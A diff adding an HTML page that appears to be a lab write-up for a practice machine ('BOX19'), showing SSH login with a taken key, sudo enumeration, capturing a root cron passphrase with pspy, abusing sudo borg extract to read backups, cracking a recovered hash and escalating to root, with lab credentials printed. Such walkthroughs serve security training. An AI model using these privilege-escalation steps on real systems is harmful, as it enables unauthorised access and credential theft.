@@ -1,0 +1,152 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX19</h1>
+    <h2 class="subtitle">PrivEsc</h2>
+    <p class="text">Since we got id_rsa from Database.kdbx, we can logon as sarah.</p>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/15]
+└─$ proxychains4 ssh sarah@172.16.67.19 -i id_rsa                                           
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+The authenticity of host '172.16.67.19 (172.16.67.19)' can't be established.
+ED25519 key fingerprint is SHA256:G0QTW5N1gW/ErKIoy1Auev3X1wJl4karhIwWn+FSTUE.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:33: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.67.19' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 22 Nov 2025 12:08:38 AM UTC
+
+  System load:  0.0               Processes:               150
+  Usage of /:   62.0% of 7.77GB   Users logged in:         0
+  Memory usage: 11%               IPv4 address for ens192: 172.16.67.19
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$ </code></pre></div>
+<p class="text">Let's find a vector for privilege escalation.</p>
+
+<div class="code-box"><pre><code>sarah@backup:~$ sudo -l
+Matching Defaults entries for sarah on backup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sarah may run the following commands on backup:
+    (ALL) NOPASSWD: /usr/bin/borg list *
+    (ALL) NOPASSWD: /usr/bin/borg extract *
+    (ALL) NOPASSWD: /usr/bin/borg mount *</code></pre></div>
+
+    <p class="text">Though we have sudo privilege, idk how to leverage it.</p>
+    <p class="text">Searching a keyword <u>what is borg 1.1.15</u> using google revealed it's python library, and there is no CVE. However, with further research, I found it is backup system. Since it's common to run backup system as scheduled task, we might be able to see details using pspy64. Let's use it.</p>
+<div class="code-box"><pre><code>sarah@backup:~$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+
+...
+
+2025/11/22 00:20:02 CMD: UID=0     PID=9471   | /bin/sh -c BORG_PASSPHRASE='<u>xinyVzoH2AnJpRK9sfMgBA</u>' borg delete /opt/borgbackup::usb_1763770353                                                                                                                   
+2025/11/22 00:20:02 CMD: UID=0     PID=9472   | /usr/bin/python3 /usr/bin/borg delete /opt/borgbackup::usb_1763770353 
+2025/11/22 00:20:02 CMD: UID=0     PID=9473   | /usr/bin/python3 /usr/bin/borg delete /opt/borgbackup::usb_1763770353 
+2025/11/22 00:20:02 CMD: UID=0     PID=9474   | /bin/bash /root/createbackup.sh 
+2025/11/22 00:20:02 CMD: UID=0     PID=9475   | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg delete /opt/borgbackup::usb_1763770338                                                                                                                   
+2025/11/22 00:20:02 CMD: UID=0     PID=9476   | /usr/bin/python3 /usr/bin/borg delete /opt/borgbackup::usb_1763770338 
+2025/11/22 00:20:02 CMD: UID=0     PID=9477   | /usr/bin/python3 /usr/bin/borg delete /opt/borgbackup::usb_1763770338 
+2025/11/22 00:20:03 CMD: UID=0     PID=9478   | /bin/bash /root/createbackup.sh 
+2025/11/22 00:20:03 CMD: UID=0     PID=9479   | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg delete /opt/borgbackup::usb_1763770323  </code></pre></div>
+
+<p class="text">We found passphrase. We don't know how to use it now, but take note and go ahead.</p>
+
+<h2 class="subtitle">Exploit</h2>
+<p class="text">Since it is python library, there would be well written documentation.</p>
+<p class="text">Searching documents, I found <a href="https://borgbackup.readthedocs.io/en/1.1.15/usage/extract.html">this</a>. Accourding to this docs, the command <u>extract</u> is ...</p>
+<p class="text"><strong>This command extracts the contents of an archive. By default the entire archive is extracted but a subset of files and directories can be selected by passing a list of PATHs as arguments. The file selection can further be restricted by using the --exclude option.</strong></p>
+<p class="text">Also, there is usage page. We can use this code and do application.</p>
+<div class="code-box"><pre><code>borg create -s --progress <u>repo::archive path</u>  # good and preferred</code></pre></div>
+<p class="text">Since I found --stdout flag, we can cat all files in any path.</p>
+<div class="code-box"><pre><code>sarah@backup:~$ sudo /usr/bin/borg extract --stdout /opt/borgbackup::home
+Enter passphrase for key /opt/borgbackup: 
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/
+
+...
+
+if [ "$BASH" ]; then
+  if [ -f ~/.bashrc ]; then
+    . ~/.bashrc
+  fi
+fi
+
+mesg n 2> /dev/null || true
+sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
+{
+    "user": "<u>amy</u>",
+    "pass": "<u>0814b6b7f0de51ecf54ca5b6e6e612bf</u>"
+}
+32022-10-17T22:29:47.295286/opt/borgbackup00000000200000a1</code></pre></div>
+
+<p class="text">I found user credential, and i could decoded it. 0814b6b7f0de51ecf54ca5b6e6e612bf : <u>backups1</u></p>
+
+<div class="code-box"><pre><code>sarah@backup:~$ su amy
+Password: 
+$ bash
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+amy@backup:/home/sarah$ sudo -l
+Matching Defaults entries for amy on backup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User amy may run the following commands on backup:
+    (ALL) NOPASSWD: ALL
+    (ALL : ALL) ALL</code></pre></div>
+
+    <p class="text">I simply generated root bash.</p>
+
+
+    <p class="text">There is interesting file.</p>
+    <div class="code-box"><pre><code>root@backup:~# cat rsync.sh
+sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.10.20:/etc/ /opt/backup/etc/</code></pre></div>
+
+<p class="text">We got access credential for BOX20. Perfect. Next target is BOX20.</p>
+
+</body>
+</html>
